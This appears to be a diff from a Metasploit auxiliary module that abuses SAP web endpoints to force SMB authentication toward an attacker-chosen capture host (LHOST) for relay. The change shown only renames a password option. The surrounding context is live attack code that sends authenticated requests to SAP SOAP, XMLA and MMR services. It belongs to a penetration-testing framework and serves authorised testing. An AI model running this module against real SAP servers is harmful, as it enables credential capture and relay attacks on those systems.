@@ -54,7 +54,7 @@ class MetasploitModule < Msf::Auxiliary
       Opt::RPORT(8000),
       OptString.new('CLIENT',   [true,  'SAP client', '001']),
       OptString.new('HTTPUSERNAME', [false, 'Username (Ex SAP*)']),
-      OptString.new('HTTPPASSWORD', [false, 'Password (Ex 06071992)']),
+      OptString.new('HttpPassword', [false, 'Password (Ex 06071992)']),
       OptAddress.new('LHOST',   [true,  'Server IP or hostname of the SMB Capture system']),
       OptEnum.new('ABUSE',      [true,  'SMB Relay abuse to use', "MMR",
         [
@@ -73,7 +73,7 @@ class MetasploitModule < Msf::Auxiliary
       return false
     end
 
-    if datastore['HTTPPASSWORD'].blank?
+    if datastore['HttpPassword'].blank?
       return false
     end
     return true
@@ -98,7 +98,7 @@ class MetasploitModule < Msf::Auxiliary
       res = send_request_raw({
         'uri' => '/sap/bw/xml/soap/xmla?sap-client=' + datastore['CLIENT'] + '&sap-language=EN',
         'method' => 'POST',
-        'authorization' => basic_auth(datastore['HTTPUSERNAME'], datastore['HTTPPASSWORD']),
+        'authorization' => basic_auth(datastore['HTTPUSERNAME'], datastore['HttpPassword']),
         'data' => data,
         'ctype' => 'text/xml; charset=UTF-8',
         'cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT']
@@ -137,7 +137,7 @@ class MetasploitModule < Msf::Auxiliary
         res = send_request_cgi({
           'uri' => '/mmr/MMR',
           'method' => 'GET',
-          'authorization' => basic_auth(datastore['HTTPUSERNAME'], datastore['HTTPPASSWORD']),
+          'authorization' => basic_auth(datastore['HTTPUSERNAME'], datastore['HttpPassword']),
           'cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],
           'ctype' => 'text/xml; charset=UTF-8',
           'vars_get' => {
@@ -169,7 +169,7 @@ class MetasploitModule < Msf::Auxiliary
         'uri' => '/sap/bc/soap/rfc',
         'method' => 'POST',
         'data' => data,
-        'authorization' => basic_auth(datastore['HTTPUSERNAME'], datastore['HTTPPASSWORD']),
+        'authorization' => basic_auth(datastore['HTTPUSERNAME'], datastore['HttpPassword']),
         'cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],
         'ctype' => 'text/xml; charset=UTF-8',
         'headers' => {
